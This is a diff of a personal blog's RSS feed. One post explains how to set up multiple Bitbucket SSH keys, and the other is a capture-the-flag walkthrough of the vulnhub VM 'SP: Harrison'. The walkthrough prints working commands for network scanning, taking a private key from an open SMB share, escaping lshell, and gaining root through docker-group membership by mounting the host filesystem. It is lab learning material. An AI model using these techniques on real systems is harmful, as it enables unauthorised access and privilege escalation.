@@ -1,4 +1,5 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" ?>
+<?xml-stylesheet type="text/xsl" href="https://brigzzy.github.io/xml/base.min.xml" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on Brigzzy&#39;s Blog</title>
@@ -7,30 +8,390 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Thu, 06 Jun 2019 11:30:30 -0700</lastBuildDate>
-    
-	<atom:link href="https://brigzzy.github.io/post/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <atom:link href="https://brigzzy.github.io/post/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Configuring Bitbucket SSH with Multiple Keys</title>
       <link>https://brigzzy.github.io/post/configuring-bitbucket-ssh-multiple-keys/</link>
       <pubDate>Thu, 06 Jun 2019 11:30:30 -0700</pubDate>
-      
       <guid>https://brigzzy.github.io/post/configuring-bitbucket-ssh-multiple-keys/</guid>
-      <description>If you use Bitbucket in multiple environments (for example home, and work), you may need to configure multiple SSH keys. This is because once a key has been added to bitbucket (be it a work account, or a personal one), that key can no longer be used in any other Bitbucket account.
-The problem is that when you try and clone a repo via SSH, you may get a permission denied error when you connect to bitbucket.</description>
+      <description>&lt;p&gt;If you use Bitbucket in multiple environments (for example home, and work), you may need to configure multiple SSH keys.  This is because once a key has been added to bitbucket (be it a work account, or a personal one), that key can no longer be used in any other Bitbucket account.&lt;/p&gt;
+
+&lt;p&gt;The problem is that when you try and clone a repo via SSH, you may get a permission denied error when you connect to bitbucket.org with a valid key, but not a key that&amp;rsquo;s valid for the repo you&amp;rsquo;re trying to work with.&lt;/p&gt;
+
+&lt;p&gt;To get around this, you can make an ssh config file that matches the host, username, and key you want to use.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;If you haven&amp;rsquo;t already, generate your new SSH key that you want to use with Bitbucket:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ssh-keygen -o -a 100 -t ed25519 -f ~/.ssh/id_bitbucket_personal
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Add the public key to your Bitbucket account&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Create a &lt;code&gt;~/.ssh/config&lt;/code&gt; file&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Add the following lines, substituting your values&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Host bitbucket.org
+User &amp;lt;someone&amp;gt;
+Hostname bitbucket.org
+IdentitiesOnly yes
+IdentityFile ~/.ssh/id_bitbucket_personal
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Note that you can use any name in the User field.  You probably don&amp;rsquo;t want to use git, if you&amp;rsquo;re using that as your identity for another account.&lt;/p&gt;
+&lt;/blockquote&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Now you can clone the repo from bitbucket.org, replacing the username git with the user you&amp;rsquo;ve configured in the ssh config file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;git clone someone@bitbucket.org:myorg/repo.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
     </item>
-    
     <item>
       <title>Writup - SP: Harrison</title>
       <link>https://brigzzy.github.io/post/writup-sp-harrison/</link>
       <pubDate>Sat, 25 May 2019 21:23:54 -0700</pubDate>
-      
       <guid>https://brigzzy.github.io/post/writup-sp-harrison/</guid>
-      <description>Welcome to my blog! This is my first write up on a vulnhub VM. The VM in question is by Daniel Solstad, and is hosted by vulnhub.com.
-Summary:  Scan the network Scan the host Check out SMB Break out of a restricted shell Enumerate the host Get the root flag  Scan the Network: First we use netdiscover to see where the vulnerable system is.
-netdiscover -r 192.168.99.0/24  Currently scanning: Finished!</description>
+      <description>
+
+&lt;p&gt;Welcome to my blog!  This is my first write up on a vulnhub VM.  The VM in question is by &lt;a href=&#34;https://dsolstad.com/&#34;&gt;Daniel Solstad&lt;/a&gt;, and is hosted by &lt;a href=&#34;vulnhub.com&#34;&gt;vulnhub.com&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;summary&#34;&gt;Summary:&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Scan the network&lt;/li&gt;
+&lt;li&gt;Scan the host&lt;/li&gt;
+&lt;li&gt;Check out SMB&lt;/li&gt;
+&lt;li&gt;Break out of a restricted shell&lt;/li&gt;
+&lt;li&gt;Enumerate the host&lt;/li&gt;
+&lt;li&gt;Get the root flag&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&#34;scan-the-network&#34;&gt;Scan the Network:&lt;/h4&gt;
+
+&lt;p&gt;First we use netdiscover to see where the vulnerable system is.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;netdiscover -r 192.168.99.0/24
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;Currently scanning: Finished! | Screen View: Unique Hosts
+
+4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 240
+_____________________________________________________________________________
+IP At MAC Address Count Len MAC Vendor / Hostname
+-----------------------------------------------------------------------------
+192.168.99.1    52:54:00:12:35:00 1 60 Unknown vendor
+192.168.99.2    52:54:00:12:35:00 1 60 Unknown vendor
+192.168.99.3    08:00:27:dc:37:c5 1 60 PCS Systemtechnik GmbH
+192.168.99.23   08:00:27:45:0b:aa 1 60 PCS Systemtechnik GmbH
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Boom, we have out host!&lt;/p&gt;
+
+&lt;h4 id=&#34;scan-the-host&#34;&gt;Scan the Host:&lt;/h4&gt;
+
+&lt;p&gt;Now we&amp;rsquo;re going to fire up nmap, and scan the host.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nmap -T4 -A -p- 192.168.99.23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-24 16:51 PDT
+Nmap scan report for 192.168.99.23
+Host is up (0.00059s latency).
+Not shown: 65533 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 5b:87:f1:fe:67:8f:a6:ba:8b:75:3c:11:34:3d:b6:b8 (RSA)
+| 256 93:87:7e:2e:5e:4e:ce:71:56:a1:1c:6b:fc:1f:6e:55 (ECDSA)
+|_ 256 c0:14:c0:24:e8:a8:7e:d4:cd:a6:42:25:f3:48:47:94 (ED25519)
+445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+MAC Address: 08:00:27:45:0B:AA (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: Host: HARRISON; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 5s, deviation: 1s, median: 4s
+| smb-os-discovery:
+| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+| Computer name: harrison
+| NetBIOS computer name: HARRISON\x00
+| Domain name: \x00
+| FQDN: harrison
+|_ System time: 2019-05-24T23:52:14+00:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2019-05-24 16:52:15
+|_ start_date: N/A
+
+TRACEROUTE
+HOP RTT ADDRESS
+1 0.59 ms 192.168.99.23
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From the scan, we can see that port 445 (SMB) is open.  SMB usually indicates file shares.  Let&amp;rsquo;s do another scan and see if we can get some more information.  Nmap has a great script for hunting for SMB shares:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;nmap --script=smb-enum-shares 192.168.99.23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-24 16:56 PDT
+Nmap scan report for 192.168.99.23
+Host is up (0.00015s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE
+22/tcp open ssh
+445/tcp open microsoft-ds
+MAC Address: 08:00:27:45:0B:AA (Oracle VirtualBox virtual NIC)
+
+Host script results:
+| smb-enum-shares:
+| account_used: &amp;lt;blank&amp;gt;
+| \\192.168.99.23\IPC$:
+| Type: STYPE_IPC_HIDDEN
+| Comment: IPC Service (Samba 4.7.6-Ubuntu)
+| Users: 1
+| Max Users: &amp;lt;unlimited&amp;gt;
+| Path: C:\tmp
+| Anonymous access: READ/WRITE
+| \\192.168.99.23\Private:
+| Type: STYPE_DISKTREE
+| Comment:
+| Users: 0
+| Max Users: &amp;lt;unlimited&amp;gt;
+| Path: C:\home\harrison
+|_ Anonymous access: READ/WRITE
+
+Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well, well, well, looks like Harrison&amp;rsquo;s home directory is wide open!  Let&amp;rsquo;s connect and see what&amp;rsquo;s in there.&lt;/p&gt;
+
+&lt;h4 id=&#34;check-out-smb&#34;&gt;Check out SMB:&lt;/h4&gt;
+
+&lt;p&gt;Since anonymous access is enabled, we can just use smbclient to connect to the share and poke around:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;smbclient -N //192.168.99.23/Private
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# smbclient -N //192.168.99.23/Private
+Anonymous login successful
+Try &amp;quot;help&amp;quot; to get a list of possible commands.
+smb: \&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once we&amp;rsquo;re in, we can see that we are indeed in a home directory.  Let&amp;rsquo;s grab some interesting files:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;smb: \&amp;gt; ls
+. D 0 Thu Apr 18 09:55:51 2019
+.. D 0 Thu Apr 18 09:12:55 2019
+.bash_logout H 220 Wed Apr 4 11:30:26 2018
+.profile H 807 Wed Apr 4 11:30:26 2018
+.bashrc H 3771 Wed Apr 4 11:30:26 2018
+silly_cats D 0 Thu Apr 18 09:55:51 2019
+.ssh DH 0 Thu Apr 18 09:42:57 2019
+flag.txt N 32 Thu Apr 18 09:14:18 2019
+
+32894736 blocks of size 1024. 27324024 blocks available
+smb: \&amp;gt; get flag.txt
+getting file \flag.txt of size 32 as flag.txt (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
+smb: \&amp;gt; get .ssh\
+.ssh\authorized_keys .ssh\id_rsa .ssh\id_rsa.pub
+smb: \&amp;gt; get .ssh\id_rsa
+getting file \.ssh\id_rsa of size 1679 as .ssh\id_rsa (164.0 KiloBytes/sec) (average 83.5 KiloBytes/sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We have a user flag!  Let&amp;rsquo;s download it and check it out.  We also have a private key in the .ssh folder.  We can probably use this to log into the system via SSH.&lt;/p&gt;
+
+&lt;p&gt;First we&amp;rsquo;ll check out the flag:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cat flag.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# cat flag.txt
+It&#39;s not going to be that easy.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Wouldn&amp;rsquo;t be much of a prison if we could just grab the flag off an open file share, would it?  Let&amp;rsquo;s SSH in (after fixing the permissions on the private key):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;chmod 600 id_rsa &amp;amp;&amp;amp; ssh -i id_rsa harrison@192.168.99.23
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# chmod 600 id_rsa
+root@kali:~# ssh -i id_rsa harrison@192.168.99.23
+The authenticity of host &#39;192.168.99.23 (192.168.99.23)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:4dYpYoutbqxX67U1GWar5n+R7JcfOY9yGk2HJbI1mKs.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &#39;192.168.99.23&#39; (ECDSA) to the list of known hosts.
+
+Welcome to Harrison. Enjoy your shell.
+
+Type &#39;?&#39; or &#39;help&#39; to get the list of allowed commands
+harrison:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Boom, we got a user shell!&lt;/p&gt;
+
+&lt;h4 id=&#34;break-out-of-a-restricted-shell&#34;&gt;Break out of a restricted shell:&lt;/h4&gt;
+
+&lt;p&gt;Looks like the shell we have is pretty locked down:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison:~$ ls
+flag.txt silly_cats
+harrison:~$ cd /
+*** forbidden path: /
+harrison:~$ sudo -l
+*** forbidden sudo command: sudo -l
+harrison:~$ ?
+cd clear echo exit help history ll lpath ls lsudo
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is our toolkit.  Not much to work with.  In order to break out, we&amp;rsquo;ll need to figure out which restricted shell we&amp;rsquo;re in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison:~$ echo $SHELL
+*** forbidden path: /usr/bin/lshell
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;OK, so it&amp;rsquo;s something called &lt;a href=&#34;https://github.com/ghantoos/lshell&#34;&gt;lshell&lt;/a&gt;.  To escape the shell, I did some searching, and found a bug on the lshell bugtracker that we can use to get into a real shell:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison:~$ echo &amp;amp;&amp;amp; &#39;bash&#39;
+harrison@harrison:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;enumerate-the-host&#34;&gt;Enumerate the Host:&lt;/h4&gt;
+
+&lt;p&gt;Now that we have a real shell, let&amp;rsquo;s do some manual host enumeration. Just for fun, we check /root, and find that we can read the files in it!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison@harrison:~$ ls /root
+flag.txt
+harrison@harrison:~$ cat /root/flag.txt
+Nope. No flags here. Where do you think you are?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well, hmm.  Looks like the flag isn&amp;rsquo;t here.  But the name of the game is to read the root flag, right?  Let&amp;rsquo;s keep looking.  We can poke at the host by hand, but I like using this LinEnum script:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh &amp;amp;&amp;amp; chmod +x LinEnum.sh &amp;amp;&amp;amp; ./LinEnum.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison@harrison:~$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+--2019-05-25 00:35:05-- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.40.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.40.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 45639 (45K) [text/plain]
+Saving to: &#39;LinEnum.sh&#39;
+
+LinEnum.sh 100%[========================================&amp;gt;] 44.57K --.-KB/s in 0.06s
+
+2019-05-25 00:35:06 (740 KB/s) - &#39;LinEnum.sh&#39; saved [45639/45639]
+
+harrison@harrison:~$ chmod +x LinEnum.sh
+harrison@harrison:~$ ./LinEnum.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The output from this command is pretty long, and you should definitely read through it all, so you know what it&amp;rsquo;s capable of, but in the interest of shortening the post, I&amp;rsquo;ll show you what caught my eye:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[+] Looks like we&#39;re in a Docker container:
+12:blkio:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+11:perf_event:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+9:memory:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+8:devices:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+7:freezer:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+6:net_cls,net_prio:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+5:cpuset:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+4:hugetlb:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+3:pids:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+2:cpu,cpuacct:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+1:name=systemd:/docker/487be6aafa6f7791ab73237ca612e8d7a59326a15aa7fdb4a5fbfbcf69cc91d2
+-rwxr-xr-x 1 root root 0 May 24 23:39 /.dockerenv
+
+[+] We&#39;re a member of the (docker) group - could possibly misuse these rights!
+uid=1000(harrison) gid=1000(harrison) groups=1000(harrison),27(sudo),999(docker)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Jackpot!  We&amp;rsquo;re in a Docker container.  Even better, we&amp;rsquo;re a member of the docker group.  That means we can run docker ourselves.  Without getting too technical, when you run a docker container, unless you tell it not to, it&amp;rsquo;ll run as root.  If you run a container as root (Which you&amp;rsquo;re allowed to do as a member of the Docker group), and mount the underlying file system, you basically have root on that system!  Pretty neat, huh?&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s see how it&amp;rsquo;s done&lt;/p&gt;
+
+&lt;h4 id=&#34;get-the-root-flag&#34;&gt;Get the Root Flag:&lt;/h4&gt;
+
+&lt;p&gt;To misuse docker, we need to run it.  Alas:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison@harrison:~$ docker
+bash: docker: command not found
+harrison@harrison:~$ which docker
+harrison@harrison:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Docker isn&amp;rsquo;t installed in the container.  Installing it would be tricky, since we don&amp;rsquo;t have sudo, or the root password.  Good news is that Docker offers the binaries for download, without needing to install them:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;wget https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz &amp;amp;&amp;amp; tar zxf docker-18.03.0-ce.tgz &amp;amp;&amp;amp; cd docker &amp;amp;&amp;amp; ./docker
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison@harrison:~$ wget https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz
+--2019-05-25 00:50:07-- https://download.docker.com/linux/static/stable/x86_64/docker-18.03.0-ce.tgz
+Resolving download.docker.com (download.docker.com)... 13.224.2.97, 13.224.2.123, 13.224.2.101, ...
+Connecting to download.docker.com (download.docker.com)|13.224.2.97|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 38752537 (37M) [application/x-tar]
+Saving to: &#39;docker-18.03.0-ce.tgz&#39;
+
+docker-18.03.0-ce.tgz 100%[============================================================================================================&amp;gt;] 36.96M 13.1MB/s in 2.8s
+
+2019-05-25 00:50:10 (13.1 MB/s) - &#39;docker-18.03.0-ce.tgz&#39; saved [38752537/38752537]
+
+harrison@harrison:~$ tar zxf docker-18.03.0-ce.tgz
+harrison@harrison:~$ ls
+LinEnum.sh docker docker-18.03.0-ce.tgz flag.txt silly_cats
+harrison@harrison:~$ cd docker
+harrison@harrison:~/docker$ ls
+docker docker-containerd docker-containerd-ctr docker-containerd-shim docker-init docker-proxy docker-runc dockerd
+harrison@harrison:~/docker$ ./docker
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now let&amp;rsquo;s run the container.  We&amp;rsquo;re going to mount the root filesystem for the underlying host at the /home directory in the new container:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;./docker run -it -v /:/home/ ubuntu bash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;harrison@harrison:~/docker$ ./docker run -it -v /:/home/ ubuntu bash
+root@bec2ede58b0f:/#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Note that the prompt changes.  We&amp;rsquo;re now the root user in this new container.  Let&amp;rsquo;s take a look at the home directory:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cat /home/root/flag.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;root@bec2ede58b0f:/# ls # This is the container file system
+bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+root@bec2ede58b0f:/# cd /home
+root@bec2ede58b0f:/home# ls # This is the file system on the host!
+bin boot dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin srv swapfile sys tmp usr var vmlinuz vmlinuz.old
+root@bec2ede58b0f:/home# cat root/flag.txt
+Do you think you are out?
+
+Just kidding, here is your flag: 1xcDF933mce
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And that&amp;rsquo;s that!  I hope you enjoyed reading this!  I&amp;rsquo;m certainly not and expert at pentesting, but I&amp;rsquo;m going to try and continue doing writeups of boxes that I&amp;rsquo;m successful at breaking into.&lt;/p&gt;
+</description>
     </item>
-    
   </channel>
 </rss>
